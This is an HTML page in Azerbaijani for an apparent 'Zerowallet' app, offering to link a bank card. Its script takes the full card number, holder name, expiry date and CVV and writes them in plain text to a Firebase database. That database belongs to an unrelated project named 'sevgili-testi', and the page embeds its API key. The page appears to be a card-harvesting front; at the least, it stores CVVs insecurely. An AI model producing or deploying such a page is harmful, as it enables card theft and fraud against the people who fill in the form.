<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bank Kartı Bağla - Zerowallet</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&family=Space+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #020617; --primary: #6366f1; --danger: #ff4d4d; --success: #22c55e; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; padding: 20px; min-height: 100vh; }
        .top-nav { display: flex; align-items: center; margin-bottom: 25px; }
        .back-btn { font-size: 1.5rem; color: #94a3b8; cursor: pointer; margin-right: 15px; }
        .card-view {
            width: 100%; height: 200px; background: linear-gradient(135deg, #312e81 0%, #1e1b4b 100%);
            border-radius: 20px; padding: 25px; position: relative; margin-bottom: 30px; border: 1px solid rgba(255,255,255,0.1);
        }
        .brand-icon { position: absolute; top: 20px; right: 20px; width: 45px; }
        .chip { width: 45px; height: 35px; background: linear-gradient(135deg, #ffd700, #b8860b); border-radius: 6px; margin-bottom: 20px; }
        .card-num-v { font-family: 'Space Mono', monospace; font-size: 1.2rem; letter-spacing: 2px; display: block; margin-bottom: 25px; }
        .input-box { margin-bottom: 15px; }
        .input-box label { display: block; font-size: 0.7rem; font-weight: 700; color: #64748b; margin-bottom: 5px; }
        input { width: 100%; padding: 14px; background: #0f172a; border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; color: #fff; outline: none; }
        input:focus { border-color: var(--primary); }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; border: none; padding: 16px; border-radius: 15px; font-weight: 800; cursor: pointer; margin-top: 15px; }
        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 12px 25px; border-radius: 10px; font-weight: 700; display: none; z-index: 1000; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
    </style>
</head>
<body>

    <div id="toast"></div>

    <div class="top-nav">
        <i class="fas fa-chevron-left back-btn" onclick="history.back()"></i>
        <div style="font-weight:800">KART ƏLAVƏ ET</div>
    </div>

    <div class="card-view">
        <img src="visa.png" id="brand-logo" class="brand-icon" style="display:none">
        <div class="chip"></div>
        <span class="card-num-v" id="v-number">**** **** **** ****</span>
        <div style="display:flex; justify-content:space-between; font-size:0.8rem">
            <div><small style="color:#94a3b8">SAHİB</small><br><span id="v-name">AD SOYAD</span></div>
            <div><small style="color:#94a3b8">TARİX</small><br><span id="v-expiry">MM/YY</span></div>
        </div>
    </div>

    <div class="form">
        <div class="input-box"><label>KART NÖMRƏSİ</label><input type="text" id="i-number" maxlength="19" placeholder="0000 0000 0000 0000"></div>
        <div class="input-box"><label>AD SOYAD</label><input type="text" id="i-name" placeholder="ELVIN ALIYEV"></div>
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px">
            <div class="input-box"><label>TARİX</label><input type="text" id="i-expiry" maxlength="5" placeholder="MM/YY"></div>
            <div class="input-box"><label>CVV</label><input type="password" id="i-cvv" maxlength="3" placeholder="***"></div>
        </div>
        <button class="submit-btn" onclick="saveData()">TƏSDİQLƏ</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
            authDomain: "sevgili-testi.firebaseapp.com",
            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
            projectId: "sevgili-testi",
            storageBucket: "sevgili-testi.firebasestorage.app",
            messagingSenderId: "399260477557",
            appId: "1:399260477557:web:584204a698d7bf145bb03c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const user = localStorage.getItem('zerowallet_session');

        const numInp = document.getElementById('i-number');
        const nameInp = document.getElementById('i-name');
        const expInp = document.getElementById('i-expiry');
        const brandLogo = document.getElementById('brand-logo');

        numInp.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            if(val.startsWith('4')) { brandLogo.src = 'visa.png'; brandLogo.style.display = 'block'; }
            else if(val.startsWith('5')) { brandLogo.src = 'master.png'; brandLogo.style.display = 'block'; }
            else { brandLogo.style.display = 'none'; }
            let f = val.match(/.{1,4}/g)?.join(' ') || val;
            e.target.value = f;
            document.getElementById('v-number').innerText = f || "**** **** **** ****";
        });

        nameInp.addEventListener('input', (e) => {
            let v = e.target.value.toUpperCase();
            e.target.value = v;
            document.getElementById('v-name').innerText = v || "AD SOYAD";
        });

        expInp.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            if(val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2,4);
            e.target.value = val;
            document.getElementById('v-expiry').innerText = val || "MM/YY";
        });

        function showStatus(msg, type) {
            const t = document.getElementById('toast');
            t.innerText = msg;
            t.style.background = type === 'err' ? 'var(--danger)' : 'var(--success)';
            t.style.display = 'block';
            if(type === 'err') setTimeout(() => t.style.display = 'none', 3000);
        }

        function saveData() {
            const n = numInp.value.replace(/\s/g, '');
            if(n.length < 16 || nameInp.value.length < 5 || expInp.value.length < 5) return showStatus("Məlumatları düzgün daxil edin!", "err");

            db.ref('zerowallet_users/' + user + '/cardInfo').set({
                number: n, holder: nameInp.value, expiry: expInp.value, cvv: document.getElementById('i-cvv').value, date: Date.now()
            }).then(() => {
                showStatus("Kart uğurla əlavə olundu!", "success");
                setTimeout(() => location.href = 'main.html', 2000);
            });
        }
    </script>
</body>
</html>
